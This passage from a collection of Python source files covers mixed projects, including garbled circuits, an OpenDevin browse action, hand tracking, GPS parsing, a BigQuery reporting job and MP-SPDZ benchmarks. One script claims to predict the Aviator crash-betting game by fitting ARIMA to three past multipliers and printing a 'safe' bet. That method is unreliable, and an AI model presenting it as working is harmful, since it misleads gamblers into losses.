try:\n        c = mcolors.to_rgb(color)\n        c = mcolors.rgb_to_hsv(c)\n        c = (c[0], c[1], max(0, min(1, c[2] * (1 + amount))))\n        c = mcolors.hsv_to_rgb(c)\n        return mcolors.to_hex(c)\n    except:\n        print('Error: Invalid color: ', color)\n        return color\n\n\n\n",
    "import numpy as np\r\nfrom numpy import float32\r\nfrom statsmodels.tsa.arima.model import ARIMA\r\nimport pyautogui\r\nfrom PIL import Image\r\nfrom pytesseract import * \r\npytesseract.tesseract_cmd = r'C:\\Users\\Anathi\\AppData\\Local\\Programs\\Tesseract-OCR\\tesseract.exe'\r\nimport tkinter as tk\r\n\r\n# This bot tries to predict the, Aviator Plane betting game\r\n\r\ndef calc_odds():\r\n#Demo Data\r\n    # Uses sample image of the \"past multiplier\" region\r\n    #img = Image.open(\"SampleData.png\")\r\n#Live Data\r\n    # Takes a screenshot of the \"past multiplier\" region\r\n    img = pyautogui.screenshot(region=(417, 459, 809, 526))\r\n\r\n    # Upscales image for more accurate samples (NOTE: A higher upscaling factor is slower to process)\r\n    newSize = tuple(4*x for x in img.size)\r\n    img = img.resize(newSize, Image.BILINEAR)\r\n    output = pytesseract.image_to_string(img)\r\n\r\n    # Splits values by 'x' (e.g. 3.16x 1.14x)\r\n    output = output.split('x')\r\n\r\n    # Uses the last 3 numbers of the 'output' as input for the sequence \r\n    sequence = [float32(output[2]), float32(output[1]), float32(output[0])]\r\n\r\n    # Fit ARIMA model\r\n    model = ARIMA(sequence, order=(1, 1, 0))  # ARIMA(p, d, q) parameters\r\n    model_fit = model.fit()\r\n\r\n    # Predicts the next number\r\n    predicted_next_number = model_fit.forecast()\r\n    next_number = predicted_next_number[0]\r\n    print(\"Predicted risk number:\", next_number)\r\n    \r\n    # Takes the decimal of the predicted number and uses it as a 'Safe Prediction'\r\n    dec = next_number - int(next_number)\r\n    safe_pred = 1 + dec\r\n    print(\"Predicted safe number:\", safe_pred)\r\n\r\n# Function to call on mouse click\r\ndef on_click():\r\n    calc_odds()\r\n    \r\n# Creates a GUI for the user to interact with each round\r\nwindow = tk.Tk()\r\nwindow.title(\"Odds Calc\")\r\n\r\n# Create a button widget\r\nbutton = tk.Button(window, text=\"Calc Odds\", command=on_click)\r\nbutton.pack()\r\n\r\n# Run the tkinter event loop\r\nwindow.mainloop()\r\n\r\n# Made By Anathi Zuma 2024\r\n",
    "import random\n\nfrom utils import symmetric\nfrom garbled import labels\n\n\ndef garble_table(labeled_table):\n    \"\"\"\n    Garble a labeled logic table.\n\n    Args:\n        labeled_table (list): A list of tuples containing labeled output and input values.\n\n    Returns:\n        list: A list of tuples containing the garbled ciphertext, authentication tag, and nonce for each row in the labeled table.\n    \"\"\"\n    result = []\n\n    for row in labeled_table:\n        output_label, input_labels = row\n        key = labels.combine_keys(input_labels)\n        c, tag, nonce = symmetric.symmetric_enc(key, output_label)\n        result.append((c, tag, nonce))\n\n    random.shuffle(result)  # this isn't a secure shuffle\n\n    return result\n\n\ndef eval_garbled_table(garbled_table, inputs):\n    \"\"\"\n    Evaluate a garbled table using given inputs.\n\n    Args:\n        garbled_table (list): A list of tuples representing a garbled table.\n                              Each tuple contains two elements: ciphertext and nonce.\n        inputs (list): A list of input labels to be used for evaluating the garbled table.\n\n    Returns:\n        Any: The output label obtained by evaluating the garbled table with the given inputs.\n             If decryption fails for any row in the garbled table, it moves to the next row.\n             If all rows fail decryption, None is returned.\n    \"\"\"\n    for row in garbled_table:\n        ciphertext, nonce = row\n        try:\n            key = labels.combine_keys(inputs)\n            output_label = symmetric.symmetric_dec(key, ciphertext, nonce)\n        except ValueError:  # decryption failed, incorrect padding\n            continue\n        return output_label\n",
    "import os\nimport base64\nfrom dataclasses import dataclass\nfrom opendevin.observation import BrowserOutputObservation\nfrom opendevin.schema import ActionType\nfrom typing import TYPE_CHECKING\nfrom playwright.async_api import async_playwright\n\nfrom .base import ExecutableAction\n\nif TYPE_CHECKING:\n    from opendevin.controller import AgentController\n\n\n@dataclass\nclass BrowseURLAction(ExecutableAction):\n    url: str\n    action: str = ActionType.BROWSE\n\n    async def run(self, controller: \"AgentController\") -> BrowserOutputObservation:  # type: ignore\n        asked_url = self.url\n        if not asked_url.startswith(\"http\"):\n            asked_url = os.path.abspath(os.curdir) + self.url\n        try:\n            async with async_playwright() as p:\n                browser = await p.chromium.launch()\n                page = await browser.new_page()\n                response = await page.goto(asked_url)\n                # content = await page.content()\n                inner_text = await page.evaluate(\"() => document.body.innerText\")\n                screenshot_bytes = await page.screenshot(full_page=True)\n                await browser.close()\n\n                screenshot_base64 = base64.b64encode(screenshot_bytes).decode(\"utf-8\")\n                return BrowserOutputObservation(\n                    content=inner_text,  # HTML content of the page\n                    screenshot=screenshot_base64,  # Base64-encoded screenshot\n                    url=asked_url,\n                    status_code=response.status if response else 0,  # HTTP status code\n                )\n        except Exception as e:\n            return BrowserOutputObservation(\n                content=str(e),\n                screenshot=\"\", \n                error=True,\n                url=asked_url\n            )\n\n\n    @property\n    def message(self) -> str:\n        return f\"Browsing URL: {self.url}\"\n",
    "# Copyright 2016\u20132021 Julien Danjou\n# Copyright 2016 Joshua Harlow\n# Copyright 2013-2014 Ray Holder\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n# http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\nimport abc\nimport typing\n\nfrom pip._vendor.tenacity import _utils\n\nif typing.TYPE_CHECKING:\n    import threading\n\n    from pip._vendor.tenacity import RetryCallState\n\n\nclass stop_base(abc.ABC):\n    \"\"\"Abstract base class for stop strategies.\"\"\"\n\n    @abc.abstractmethod\n    def __call__(self, retry_state: \"RetryCallState\") -> bool:\n        pass\n\n    def __and__(self, other: \"stop_base\") -> \"stop_all\":\n        return stop_all(self, other)\n\n    def __or__(self, other: \"stop_base\") -> \"stop_any\":\n        return stop_any(self, other)\n\n\nStopBaseT = typing.Union[stop_base, typing.Callable[[\"RetryCallState\"], bool]]\n\n\nclass stop_any(stop_base):\n    \"\"\"Stop if any of the stop condition is valid.\"\"\"\n\n    def __init__(self, *stops: stop_base) -> None:\n        self.stops = stops\n\n    def __call__(self, retry_state: \"RetryCallState\") -> bool:\n        return any(x(retry_state) for x in self.stops)\n\n\nclass stop_all(stop_base):\n    \"\"\"Stop if all the stop conditions are valid.\"\"\"\n\n    def __init__(self, *stops: stop_base) -> None:\n        self.stops = stops\n\n    def __call__(self, retry_state: \"RetryCallState\") -> bool:\n        return all(x(retry_state) for x in self.stops)\n\n\nclass _stop_never(stop_base):\n    \"\"\"Never stop.\"\"\"\n\n    def __call__(self, retry_state: \"RetryCallState\") -> bool:\n        return False\n\n\nstop_never = _stop_never()\n\n\nclass stop_when_event_set(stop_base):\n    \"\"\"Stop when the given event is set.\"\"\"\n\n    def __init__(self, event: \"threading.Event\") -> None:\n        self.event = event\n\n    def __call__(self, retry_state: \"RetryCallState\") -> bool:\n        return self.event.is_set()\n\n\nclass stop_after_attempt(stop_base):\n    \"\"\"Stop when the previous attempt >= max_attempt.\"\"\"\n\n    def __init__(self, max_attempt_number: int) -> None:\n        self.max_attempt_number = max_attempt_number\n\n    def __call__(self, retry_state: \"RetryCallState\") -> bool:\n        return retry_state.attempt_number >= self.max_attempt_number\n\n\nclass stop_after_delay(stop_base):\n    \"\"\"Stop when the time from the first attempt >= limit.\"\"\"\n\n    def __init__(self, max_delay: _utils.time_unit_type) -> None:\n        self.max_delay = _utils.to_seconds(max_delay)\n\n    def __call__(self, retry_state: \"RetryCallState\") -> bool:\n        if retry_state.seconds_since_start is None:\n            raise RuntimeError(\"__call__() called but seconds_since_start is not set\")\n        return retry_state.seconds_since_start >= self.max_delay\n",
    "import cv2\nimport mediapipe as mp\n\nfrom settings import *\nimport numpy as np\n\nmp_drawing = mp.solutions.drawing_utils\nmp_drawing_styles = mp.solutions.drawing_styles\nmp_hands = mp.solutions.hands\n\n#TODO: Change the detection mode here to Gesture\n\nclass HandTracking:\n    def __init__(self):\n        self.hand_tracking = mp_hands.Hands(min_detection_confidence=0.5, min_tracking_confidence=0.5)\n        self.hand_x = 0\n        self.hand_y = 0\n        self.results = None\n        self.hand_closed = False\n\n\n    def scan_hands(self, image):\n        rows, cols, _ = image.shape\n\n        # Flip the image horizontally for a later selfie-view display, and convert\n        # the BGR image to RGB.\n        image = cv2.cvtColor(cv2.flip(image, 1), cv2.COLOR_BGR2RGB)\n        # To improve performance, optionally mark the image as not writeable to\n        # pass by reference.\n        image.flags.writeable = False\n        self.results = self.hand_tracking.process(image)\n\n        # Draw the hand annotations on the image.\n        image.flags.writeable = True\n        image = cv2.cvtColor(image, cv2.COLOR_RGB2BGR)\n\n        self.hand_closed = False\n\n        if self.results.multi_hand_landmarks:\n            for hand_landmarks in self.results.multi_hand_landmarks:\n                x, y = hand_landmarks.landmark[9].x, hand_landmarks.landmark[9].y\n\n                self.hand_x = int(x * SCREEN_WIDTH)\n                self.hand_y = int(y * SCREEN_HEIGHT)\n\n                x1, y1 = hand_landmarks.landmark[12].x, hand_landmarks.landmark[12].y\n\n                if y1 > y:\n                    self.hand_closed = True\n\n                mp_drawing.draw_landmarks(\n                    image,\n                    hand_landmarks,\n                    mp_hands.HAND_CONNECTIONS,\n                    mp_drawing_styles.get_default_hand_landmarks_style(),\n                    mp_drawing_styles.get_default_hand_connections_style())\n        return image\n\n    def get_hand_center(self):\n        return (self.hand_x, self.hand_y)\n\n\n    def display_hand(self):\n        cv2.imshow(\"image\", self.image)\n        cv2.waitKey(1)\n\n    def is_hand_closed(self):\n\n        pass\n\n\n",
    "'''Common python errors'''\n\n# def sum_of_numbers(numbers_list):\n#     '''Takes a list of numbers and returns their sum'''\n#     result_sum = 0\n#     for number in numbers_list:\n#         result_sum += number\n#     return result_sum\n\n# sum_of_numbers([1, 2, 3])\n\n# SyntaxError\n# print(\"Hello, world!\"\n\n# IndentationError\n# def hello_world():\n# print(\"Hello, world!\")\n\n# hello_world()\n\n# NameError\n# message = '123' # Fix the bug\n# print(message)\n\n# IndexError\n# numbers_list = [1, 2, 3]\n# print(numbers_list[3])\n# print(numbers_list[2])# Fix\n\n# TypeError\n# result = \"First\" + 10\n# print(result)\n# result = 'First' + str(10) # Fix\n# print(result) # Fix\n\n# ValueError\n# result = input(\"\u0412\u0432\u0435\u0434\u0456\u0442\u044c \u0447\u0438\u0441\u043b\u043e: \")\n# print(int(result) + 1)\n\nnumber_one = 1\nnumber_two = 2\n\n# if number_one > 0 and number_one < 10 \\\n#     or number_two > 0 and number_two < 10:\n#     print(\"Correct\")\ncheck_one = number_one > 0 and number_one < 10\ncheck_two = number_two > 0 and number_two < 10\nif check_one or check_two:\n    print(\"Correct\")\n\nprint('aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa', \\\n      'fdgdgdgdgdgdg')\n\nmy_dict = {\n    \"key_1\": 1,\n    \"key_2\": 2\n}\n",
    "\"\"\"\n\nController for the NEO-6M GPS receiver\n\nauthors: nathanielhayman@gmail.com\n\n\"\"\"\n\nimport serial\nimport time\nimport string\nimport pynmea2\n\n\nclass GPSController:  \n    LATITUDE_INDEX=2\n    LONGITUDE_INDEX=4\n    ALTITUDE_INDEX=9\n\n    def __init__(self):\n        port=\"/dev/ttyAMA0\"\n        self.serial = serial.Serial(port, baudrate=9600, timeout=0.5)\n        self.data_out = pynmea2.NMEAStreamReader()\n    \n    # Captures a snapshot of various data from serial stream\n    def data_snapshot(self):\n        data = self.serial.readline()\n        if data[0:6] == b'$GPGGA':\n            #changes that may or not may work, keeping the original code commented out below\n            split_data = data.decode('utf-8').split(\",\")\n            lat=float(split_data[2])\n            long=float(split_data[4])\n            alt=float(split_data[9])\n            print(\"long: \")\n            print(long)\n            return lat,long,alt\n            #msg = pynmea2.parse(data)\n            \n            # return {\"lat\": msg.latitude, \"lng\": msg.longitude}\n        return None, None, None\n\n\n",
    "from bs4 import BeautifulSoup\nimport requests\n\nimport yfinance\n\nimport os\nimport gspread\n\nimport datetime\nimport pytz\n\nfrom send_email import sendEmail\n\nimport mysql.connector\n\nfrom dotenv import load_dotenv\nload_dotenv('.env')\n\n# Set Up\nnow = datetime.datetime.now(pytz.timezone(\"Asia/Tokyo\")).strftime(\"%Y/%m/%d %H:%M:%S\")\ndate, time = now.split(\" \")\n\ndir_path = os.path.dirname(__file__)\ngc = gspread.oauth(\n    credentials_filename = os.path.join(dir_path, \"client_secret.json\"),\n    authorized_user_filename = os.path.join(dir_path, \"authorized_user.json\")\n)\n\ntarget_file = gc.open_by_key(os.getenv('FOREST_SHEET_API_KEY'))  # Target sheet\ntarget_sheet = target_file.get_worksheet(0)\n\nres = requests.get('https://nikkeiyosoku.com/usdjpy/forecast/') # Target web page\nsoup = BeautifulSoup(res.text, 'html.parser')\n\n\n# Scraype AI forecast Update date\ntag_obj = soup.find('span', class_='time-txt')\nscraped_date, scraped_time = tag_obj.string.replace(\"(\", '').split(\" \")\nscraped_date_with_year = str(datetime.datetime.today().year) + \"/\" + scraped_date\n\n# Search in Sheet with AI forecast recent updated date\nsearched_cell = target_sheet.find(scraped_date_with_year)\nif searched_cell == None:\n\n    # Scraype AI forecast\n    tag_objs = soup.find_all('p', class_='forecast-today-txt')\n    tag_list_string = [x.string for x in tag_objs]\n\n\n    # Fetch current dollar yen price\n    target_ticker = yfinance.Ticker(\"USDJPY=X\")\n    recent_prices = target_ticker.history(period='3h', interval='1m')\n    recent_price = recent_prices['Close'].iloc[-1]\n\n\n    # Write in Sheet\n    min_expected = tag_list_string[0].split()[0]\n    max_expected = tag_list_string[0].split()[2]\n    ai_expected = tag_list_string[1].replace(\"\\xa0\", '')\n\n    data_to_save = [min_expected, max_expected, ai_expected, date, time, recent_price, 0] # put 0 as a placeholder which will be updated later\n\n    target_sheet.append_row(data_to_save, value_input_option='USER_ENTERED')\n\n\n    # Send Update Info Email\n    email_message = (\"AI Forecast: \" + ai_expected\n                    + \"\\nRange: \" + min_expected + \" ~ \" + max_expected\n                    + \"\\nCurrent Price: \" + str(recent_price)\n                    + \"\\nUpdated at: \" + date + \" \" + time)\n    sendEmail(\"Today's Forest Dollar-Yen Forecast\", email_message)\n\n\n    # Insert to DB\n    mydb = mysql.connector.connect(\n        host = \"localhost\",\n        user = os.getenv('DB_USER'),\n        password = os.getenv('DB_PASSWORD'),\n        database = \"forest_database\",\n    )\n\n    mycursor = mydb.cursor()\n    sql = \"INSERT into forestapi_forestdollaryen (min_forecast, max_forecast, ai_forecast, date_created, time_created, price_when_scrayped, price_after_12_hours_scrayped) VALUES (%s, %s, %s, %s, %s, %s, %s)\"\n    mycursor.execute(sql, data_to_save)\n    mydb.commit()\n",
    "import sys as _sys\nfrom keyword import iskeyword as _iskeyword\n\n\ndef _validate_names(typename, field_names, extra_field_names):\n    \"\"\"\n    Ensure that all the given names are valid Python identifiers that\n    do not start with '_'.  Also check that there are no duplicates\n    among field_names + extra_field_names.\n    \"\"\"\n    for name in [typename] + field_names + extra_field_names:\n        if not isinstance(name, str):\n            raise TypeError('typename and all field names must be strings')\n        if not name.isidentifier():\n            raise ValueError('typename and all field names must be valid '\n                             f'identifiers: {name!r}')\n        if _iskeyword(name):\n            raise ValueError('typename and all field names cannot be a '\n                             f'keyword: {name!r}')\n\n    seen = set()\n    for name in field_names + extra_field_names:\n        if name.startswith('_'):\n            raise ValueError('Field names cannot start with an underscore: '\n                             f'{name!r}')\n        if name in seen:\n            raise ValueError(f'Duplicate field name: {name!r}')\n        seen.add(name)\n\n\n# Note: This code is adapted from CPython:Lib/collections/__init__.py\ndef _make_tuple_bunch(typename, field_names, extra_field_names=None,\n                      module=None):\n    \"\"\"\n    Create a namedtuple-like class with additional attributes.\n\n    This function creates a subclass of tuple that acts like a namedtuple\n    and that has additional attributes.\n\n    The additional attributes are listed in `extra_field_names`.  The\n    values assigned to these attributes are not part of the tuple.\n\n    The reason this function exists is to allow functions in SciPy\n    that currently return a tuple or a namedtuple to returned objects\n    that have additional attributes, while maintaining backwards\n    compatibility.\n\n    This should only be used to enhance *existing* functions in SciPy.\n    New functions are free to create objects as return values without\n    having to maintain backwards compatibility with an old tuple or\n    namedtuple return value.\n\n    Parameters\n    ----------\n    typename : str\n        The name of the type.\n    field_names : list of str\n        List of names of the values to be stored in the tuple. These names\n        will also be attributes of instances, so the values in the tuple\n        can be accessed by indexing or as attributes.  At least one name\n        is required.  See the Notes for additional restrictions.\n    extra_field_names : list of str, optional\n        List of names of values that will be stored as attributes of the\n        object.  See the notes for additional restrictions.\n\n    Returns\n    -------\n    cls : type\n        The new class.\n\n    Notes\n    -----\n    There are restrictions on the names that may be used in `field_names`\n    and `extra_field_names`:\n\n    * The names must be unique--no duplicates allowed.\n    * The names must be valid Python identifiers, and must not begin with\n      an underscore.\n    * The names must not be Python keywords (e.g. 'def', 'and', etc., are\n      not allowed).\n\n    Examples\n    --------\n    >>> from scipy._lib._bunch import _make_tuple_bunch\n\n    Create a class that acts like a namedtuple with length 2 (with field\n    names `x` and `y`) that will also have the attributes `w` and `beta`:\n\n    >>> Result = _make_tuple_bunch('Result', ['x', 'y'], ['w', 'beta'])\n\n    `Result` is the new class.  We call it with keyword arguments to create\n    a new instance with given values.\n\n    >>> result1 = Result(x=1, y=2, w=99, beta=0.5)\n    >>> result1\n    Result(x=1, y=2, w=99, beta=0.5)\n\n    `result1` acts like a tuple of length 2:\n\n    >>> len(result1)\n    2\n    >>> result1[:]\n    (1, 2)\n\n    The values assigned when the instance was created are available as\n    attributes:\n\n    >>> result1.y\n    2\n    >>> result1.beta\n    0.5\n    \"\"\"\n    if len(field_names) == 0:\n        raise ValueError('field_names must contain at least one name')\n\n    if extra_field_names is None:\n        extra_field_names = []\n    _validate_names(typename, field_names, extra_field_names)\n\n    typename = _sys.intern(str(typename))\n    field_names = tuple(map(_sys.intern, field_names))\n    extra_field_names = tuple(map(_sys.intern, extra_field_names))\n\n    all_names = field_names + extra_field_names\n    arg_list = ', '.join(field_names)\n    full_list = ', '.join(all_names)\n    repr_fmt = ''.join(('(',\n                        ', '.join(f'{name}=%({name})r' for name in all_names),\n                        ')'))\n    tuple_new = tuple.__new__\n    _dict, _tuple, _zip = dict, tuple, zip\n\n    # Create all the named tuple methods to be added to the class namespace\n\n    s = f\"\"\"\\\ndef __new__(_cls, {arg_list}, **extra_fields):\n    return _tuple_new(_cls, ({arg_list},))\n\ndef __init__(self, {arg_list}, **extra_fields):\n    for key in self._extra_fields:\n        if key not in extra_fields:\n            raise TypeError(\"missing keyword argument '%s'\" % (key,))\n ",
    "import streamlit as st\nfrom utils import get_first_row, log_choice, display_email, set_button_style\n\nDATA_CSV = 'data/data.csv'\n\ndef main():\n    st.title('Email Style Selector')\n    set_button_style()\n\n    # Load data\n    first_email_data = get_first_row(DATA_CSV)\n\n    # Displaying fixed information for context, sender, and receiver\n    context = first_email_data['email_context']\n    sender = first_email_data['from']\n    receiver = first_email_data['to']\n    gt_email = first_email_data['content']\n    \n    # these are just variables we need while writing to the file\n    id = first_email_data['id']\n    message_id = first_email_data['message_id']\n    \n    st.markdown(\"### Email Sender\")\n    st.text(sender)\n    \n    st.markdown(\"### Email Receiver\")\n    st.text(receiver)\n\n    st.markdown(\"### Email Context\")\n    st.text(context)\n    \n    st.markdown(\"### Ground Truth Email\")\n    st.text(gt_email)\n    \n    # Use columns to layout Email A and Email B side by side\n    col_a, col_b = st.columns(2)\n    email_a_content = \"Placeholder\"\n    email_b_content = \"Placeholder\"\n    \n    with col_a:\n        st.markdown(\"#### Email A\")\n        if display_email(email_a_content, 'A'):\n            log_choice(id, message_id, 'A')\n            st.success(\"You selected Email A\")\n\n    with col_b:\n        st.markdown(\"#### Email B\")\n        if display_email(email_b_content, 'B'):\n            log_choice(id, message_id, 'B')\n            st.success(\"You selected Email B\")\n\n\nif __name__ == \"__main__\":\n    main()",
    "import mysql.connector\nimport os\nimport pandas as pd\nfrom google.cloud import bigquery\nfrom google.oauth2 import service_account\nfrom google.cloud.exceptions import NotFound\nimport requests\nimport json\nfrom datetime import datetime\nfrom time import gmtime, strftime\nimport smtplib\nimport os\nfrom email.mime.text import MIMEText\nfrom email.mime.multipart import MIMEMultipart\nfrom email.mime.application import MIMEApplication\nfrom config import password, email # create config.py and add your email and password in it. I won't be adding config to this repo :)\n\n\n# define destination table details (abstracted)\ndataset = '[dataset_name]'\nproject_id = '[project_name]'\n\n# load credentials \npath = os.getcwd()\nos.chdir(path)\nos.system('cd {}'.format(path))\nos.system('pwd')\ncredentials = service_account.Credentials.from_service_account_file(\n   '[link/to/json/file]') \nos.environ['GOOGLE_APPLICATION_CREDENTIALS'] = '[link/to/json/file]' # like ./buypower-mobile-app-4567g0whk234.json for example (not a real keyfile name)\nprint(\"Credentials Loaded\")\n\n# define GBQ client\nclient =  bigquery.Client(project = project_id)\n\n# get current date\ndate =  strftime(\"%Y_%m_%d\", gmtime())\n\n# define function to pull data from GBQ (destination)\ndef pullDataFromBQ(query):\n   project_id = '[project_name]'\n   df = pd.read_gbq(query, project_id=project_id)\n   return df\n\n# define function to execute queries on GBQ\ndef bq_execute_query(query) -> object:\n    '''\n    This function is responsible for executing queries on Bigquery.\n    \n    It is used to run any query on Bigquery related to the data migration process.\n    \n    It takes the query and returns the results if the query ran successfully or prints the error message if the process didn't run successfully. \n    \n    See example below:\n\n    bq_execute_query(\"SELECT max(created_at) FROM bpcs.Msgs\") -> '2023-01-01' datatype: object\n    '''\n    print(query)\n    job_config = bigquery.QueryJobConfig()\n    job_config.allow_large_results = True\n    # Start the query, passing in the extra configuration.\n    try:\n        query_job = client.query(query, job_config=job_config)  # Make an API request.\n        query_job.result()  # Wait for the job to complete.\n        results = query_job.result()\n        return results\n    except Exception as e:\n        print(\"Failed to run the query {}\".format(query))\n        print(e)\n\n# get the data from GBQ and export them into csv files\ndef get_data_from_bq():\n    print(date)\n    q = f'''\n    with api_trans as (\n    select distinct api_id, ref,\n    string_agg(type,\"|\" order by id ) type_agg,\n    string_agg(distinct token_status,\"_\") token_status_agg\n    from\n    (select distinct awt.api_id,awt.ref,awt.type,awt.id,\n    if(tvr.vend_request_id is null, 'FAILED','SUCCESS') token_status,\n    FROM\n      `[dataset].[table_one_name]` awt\n    LEFT JOIN\n      `[dataset].[table_two_name]` pt\n    ON\n      awt.ref = pt.order_id\n      AND awt.api_id= pt.api_user_id\n    LEFT JOIN\n      `[dataset].[table_three_name]` vr\n    ON\n      pt.id = vr.order_id\n    LEFT JOIN\n      `[dataset].[table_four_name]` tvr\n    ON\n      vr.id = tvr.vend_request_id\n    JOIN\n      `[dataset].[table_five_name]` au\n    ON\n      awt.api_id = au.id\n      AND UPPER(au.type)='PREFUND'\n    where awt.created_at >= CAST(DATE_SUB(CURRENT_DATE(), INTERVAL 2 DAY) AS TIMESTAMP)\n    order by awt.id)\n    group by 1,2\n    )\n    -- FIRST SHEET -> Commission not given\n    select * from api_trans where type_agg ='vend' and token_status_agg = \"SUCCESS\"\n    '''\n    data = bq_execute_query(q)\n    first_data = data.to_dataframe()\n    print(first_data.info())\n    first_data.to_csv(f\"api_successful_vend_without_commission_{date}.csv\", index = False)\n\n    q = f'''\n    with api_trans as (\n    select distinct api_id, ref,\n    string_agg(type,\"|\" order by id ) type_agg,\n    string_agg(distinct token_status,\"_\") token_status_agg\n    from\n    (select distinct awt.api_id,awt.ref,awt.type,awt.id,\n    if(tvr.vend_request_id is null, 'FAILED','SUCCESS') token_status,\n    FROM\n      `[dataset].[table_one_name]` awt\n    LEFT JOIN\n      `[dataset].[table_two_name]` pt\n    ON\n      awt.ref = pt.order_id\n      AND awt.api_id= pt.api_user_id\n    LEFT JOIN\n      `[dataset].[table_three_name]` vr\n    ON\n      pt.id = vr.order_id\n    LEFT JOIN\n      `[dataset].[table_four_name]` tvr\n    ON\n      vr.id = tvr.vend_request_id\n    JOIN\n      `[dataset].[table_five_name]` au\n    ON\n      awt.api_id = au.id\n      AND UPPER(au.type)='PREFUND'\n    where awt.created_at >= CAST(DATE_SUB(CURRENT_DATE(), INTERVAL 2 DAY) AS TIMESTAMP)\n    order by awt.id)\n    group by 1,2\n    )\n    --SECOND SHEET: Failed transaction yet to be refunded\n    select * from api_trans where lower(type_agg) ='vend' and lower(type_agg) not in (\"topup\",\"transfer_topup\", \"transfer\") and token_status_agg like \"FAILED%\"\n\n    '''\n    data = bq_execute_query(q)\n    second_data = data.to_dataframe()\n    print(second_data.info())\n    second_data.to_csv(f\"api_failed_vend_yet_to_be_reversed_{",
    "import re\nimport math\nimport subprocess\nfrom tqdm import tqdm\n\n# Define a default filepath for MP-SPDZ\nMP_SPDZ_VERSION = \"0.3.7\"\nMP_SPDZ_FILEPATH = f\"../mp-spdz-{MP_SPDZ_VERSION}\"\n\n# MP-SPDZ protocol to use\nMP_SPDZ_PROTOCOL = \"dealer-ring\"\nUSE_EDABIT = True\nMP_SPDZ_EDABIT_FLAG = \"\"\nif USE_EDABIT:\n    MP_SPDZ_EDABIT_FLAG = \"--edabit\"\n\n# Testing constants\nN_PARTIES = 2\nN_RB = 275\n# Number of bits needed to represent N_RB\nN_RB_BITS = math.ceil(math.log2(N_RB))\n# \"Resource Sharing Efficiency in Network Slicing\" uses 35 slices for testing\nMAX_SLICES = 32\n\n\ndef extract_results(output):\n    # Define a regular expression pattern to match the desired format\n    time_pattern = r\"Time = (\\d+\\.\\d+) seconds\"\n    data_pattern = r\"Data sent = (\\d+\\.\\d+) MB\"\n    global_data_pattern = r\"Global data sent = (\\d+\\.\\d+) MB\"\n    rounds_pattern = r\"in ~(\\d+) rounds\"\n\n    # Use re.search to find the pattern in the string\n    time_match = re.search(time_pattern, output)\n    data_match = re.search(data_pattern, output)\n    global_data_match = re.search(global_data_pattern, output)\n    rounds_match = re.search(rounds_pattern, output)\n\n    # Extract the data from the match\n    extracted_time = float(time_match.group(1))\n    extracted_data = float(data_match.group(1))\n    extracted_global_data = float(global_data_match.group(1))\n    extracted_rounds = int(rounds_match.group(1))\n\n    return extracted_time, extracted_data, extracted_global_data, extracted_rounds\n\n\nprint(\"\\nTesting Protocol I\")\nprotocol_name = \"2p_protocol_i\"\noutput_filename = f\"{protocol_name}_data_{MP_SPDZ_PROTOCOL}_{N_PARTIES}P_{N_RB}RB_edabit{USE_EDABIT}_{MAX_SLICES}slices.csv\"\nwith open(output_filename, \"w\") as f:\n    f.write(\n        f\"Number Parties,Number RBs,Number Slices,{protocol_name} Time (s),{protocol_name} Single Party Data (MB),{protocol_name} Global Data (MB),{protocol_name} Rounds\"\n    )\n    for num_slices in tqdm(range(2, MAX_SLICES)):\n        # Set the command\n        command = f\"{MP_SPDZ_FILEPATH}/Scripts/compile-run.py {MP_SPDZ_EDABIT_FLAG} -E {MP_SPDZ_PROTOCOL} {protocol_name}.mpc {num_slices}\"\n\n        # Run the command in the terminal\n        output = subprocess.check_output(\n            command, shell=True, stderr=subprocess.STDOUT, text=True\n        )\n\n        # Extract the results from the output\n        time, data, global_data, rounds = extract_results(output)\n\n        f.write(\"\\n\")\n        f.write(f\"{N_PARTIES},{N_RB},{num_slices},{time},{data},{global_data},{rounds}\")\n\n\nprint(\"\\nTesting Protocol II\")\nprotocol_name = \"2p_protocol_ii\"\noutput_filename = f\"{protocol_name}_data_{MP_SPDZ_PROTOCOL}_{N_PARTIES}P_{N_RB}RB_edabit{USE_EDABIT}_{MAX_SLICES}slices.csv\"\nwith open(output_filename, \"w\") as f:\n    f.write(\n        f\"Number Parties,Number RBs,Number Slices,{protocol_name} Time (s),{protocol_name} Single Party Data (MB),{protocol_name} Global Data (MB),{protocol_name} Rounds\"\n    )\n    for num_slices in tqdm(range(2, MAX_SLICES)):\n        # Set the command\n        command = f\"{MP_SPDZ_FILEPATH}/Scripts/compile-run.py {MP_SPDZ_EDABIT_FLAG} -E {MP_SPDZ_PROTOCOL} {protocol_name}.mpc {num_slices} {N_RB} {N_RB_BITS}\"\n\n        # Run the command in the terminal\n        output = subprocess.check_output(\n            command, shell=True, stderr=subprocess.STDOUT, text=True\n        )\n\n        # Extract the results from the output\n        time, data, global_data, rounds = extract_results(output)\n\n        f.write(\"\\n\")\n        f.write(f\"{N_PARTIES},{N_RB},{num_slices},{time},{data},{global_data},{rounds}\")\n\n\nprint(\"\\nTesting Protocol III\")\nprotocol_name = \"2p_protocol_iii\"\noutput_filename = f\"{protocol_name}_data_{MP_SPDZ_PROTOCOL}_{N_PARTIES}P_{N_RB}RB_edabit{USE_EDABIT}_{MAX_SLICES}slices.csv\"\nwith open(output_filename, \"w\") as f:\n    f.write(\n        f\"Number Parties,Number RBs,Number Slices,{protocol_name} Time (s),{protocol_name} Single Party Data (MB),{protocol_name} Global Data (MB),{protocol_name} Rounds\"\n    )\n    for num_slices in tqdm(range(2, MAX_SLICES)):\n        # Set the command\n        command = f\"{MP_SPDZ_FILEPATH}/Scripts/compile-run.py {MP_SPDZ_EDABIT_FLAG} -E {MP_SPDZ_PROTOCOL} {protocol_name}.mpc {num_slices} {N_RB} {N_RB_BITS}\"\n\n        # Run the command in the terminal\n        output = subprocess.check_output(\n            command, shell=True, stderr=subprocess.STDOUT, text=True\n        )\n\n        # Extract the results from the output\n        time, data, global_data, rounds = extract_results(output)\n\n        f.write(\"\\n\")\n        f.write(f\"{N_PARTIES},{N_RB},{num_slices},{time},{data},{global_data},{rounds}\")\n",
